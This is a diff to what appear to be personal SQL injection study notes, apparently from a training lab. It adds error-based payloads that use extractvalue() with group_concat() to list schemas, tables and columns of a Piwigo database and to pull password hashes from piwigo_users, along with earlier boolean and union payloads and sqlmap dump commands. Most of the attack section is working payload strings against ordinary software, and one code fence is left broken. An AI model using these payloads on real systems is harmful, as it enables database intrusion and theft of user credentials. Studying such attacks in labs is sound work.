@@ -232,6 +232,7 @@ Connection: close
 inStock=1&name=mop%27+or+%271%27%3D%271&sort=id&order=asc
 ```
 
+For MS SQL Server
 
 ```
 1+or+1=1
@@ -336,6 +337,8 @@ name=z%27%29%29+union+select+VERSION()%2C2%2C3%2C4--+&sort=id&order=asc
 
 ```
 Union based sol:
+
+mysql
 
 ```
 ')  or ('1'='1
@@ -559,4 +562,136 @@ sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=oracle&name=tac
 
 sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=oracle&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=oracle  --dump -D SQLMAP --level 3
 ```
+
+
+
+The group_concat() function is unique to MySQL. Current versions of Microsoft SQL Server3 and PostgreSQL4 have a very similar STRING_AGG() function. Additionally, current versions of Oracle DB have a LISTAGG()5 function that is similar to the STRING_AGG() functions.
+
+
+Using ExtractValue() with group_concat()
+
+```
+asc, extractvalue('',concat('>',(
+    select group_concat(table_schema) 
+    from (
+      select table_schema 
+      from information_schema.tables 
+      group by table_schema) 
+    as foo)
+    )
+  )
+
+```
+
+```
+,+extractvalue('',concat('>',version()))
+
+,+extractvalue('',concat('>',(select+group_concat(table_schema)+from+(select+table_schema+from+information_schema.tables+group+by+table_schema)+as+foo)))
+
+```
+
+Updated payload to extract:
+
+```
+asc, extractvalue('',concat('>',(
+  select group_concat(table_name) 
+  from (
+    select table_name from information_schema.tables
+    where table_schema='piwigo') 
+  as foo)
+  )
+)
+```
+
+```
+,+extractvalue('',concat('>',(select+group_concat(table_name)+from+(select+table_name+from+information_schema.tables+where+table_schema='piwigo')+as+foo)))
+```
+
+Updated payload with LIMIT and OFFSET values:
+
+```
+asc, extractvalue('',concat('>',(
+	select group_concat(table_name) 
+	from (
+		select table_name 
+		from information_schema.tables 
+		where table_schema='piwigo' 
+		limit 2 offset 2) 
+	as foo)
+	)
+)
+```
+
+```
+,+extractvalue('',concat('>',(select+group_concat(table_name)+from+(select+table_name+from+information_schema.tables+where+table_schema='piwigo'+limit+2+offset+2)+as+foo)))
+```
+
+keep increasing offset
+
+
+at offset 32 we get piwigo_users table
+
+Payload to extract column names for piwigo_users table:
+```
+asc, extractvalue('',concat('>',(
+	select group_concat(column_name) 
+	from (
+		select column_name 
+		from information_schema.columns 
+		where table_schema='piwigo' and table_name='piwigo_users') 
+	as foo)
+	)
+)
+```
+
+```
+,+extractvalue('',concat('>',(select+group_concat(column_name)+from+(select+column_name+from+information_schema.columns+where+table_schema='piwigo'+and+table_name='piwigo_users')+as+foo)))
+```
+
+Microsoft SQL Server has a nearly identical SUBSTRING()8 function and Oracle DB has a SUBSTR()9 function that takes the same parameters. PostgreSQL has two different functions for substrings.10 The MySQL SUBSTRING() function follows the same parameter format as the SUBSTR() function. The SUBSTRING() function must include a from or for keyword in the function call.
+
+Payload to extract password values:
+```
+asc, extractvalue('',concat('>',(select substring(password,1,32) from piwigo_users limit 1 offset 0)))
+```
+```
+,+extractvalue('',concat('>',(select+substring(password,1,32)+from+piwigo_users+limit+1+offset+0)))
+'''
+Get additional chars:
+
+```
+,+extractvalue('',concat('>',(select+substring(password,30,32)+from+piwigo_users+limit+1+offset+0)))
+```
+1
+(Oracle, 2021), https://dev.mysql.com/doc/refman/8.0/en/aggregate-functions.html ↩︎
+
+2
+(Oracle, 2021), https://dev.mysql.com/doc/refman/8.0/en/aggregate-functions.html#function_group-concat ↩︎
+
+3
+(Microsoft, 2021), https://docs.microsoft.com/en-us/sql/t-sql/functions/string-agg-transact-sql?view=sql-server-ver15 ↩︎
+
+4
+(The PostgreSQL Global Development Group, 2021), https://www.postgresql.org/docs/13/functions-aggregate.html ↩︎
+
+5
+(Oracle, 2016), https://docs.oracle.com/cd/E11882_01/server.112/e41084/functions089.htm#SQLRF30030 ↩︎
+
+6
+(Oracle, 2021), https://dev.mysql.com/doc/refman/8.0/en/select.html ↩︎
+
+7
+(Oracle, 2021), https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_substring ↩︎
+
+8
+(Microsoft, 2021), https://docs.microsoft.com/en-us/sql/t-sql/functions/substring-transact-sql?view=sql-server-ver15 ↩︎
+
+9
+(Oracle, 2021), https://docs.oracle.com/cd/B19306_01/server.102/b14200/functions162.htm ↩︎
+
+10
+(The PostgreSQL Global Development Group, 2021), https://www.postgresql.org/docs/current/functions-string.html ↩︎
+
+11
+(Wikipedia, 2021), https://en.wikipedia.org/wiki/Hash_function ↩︎
 
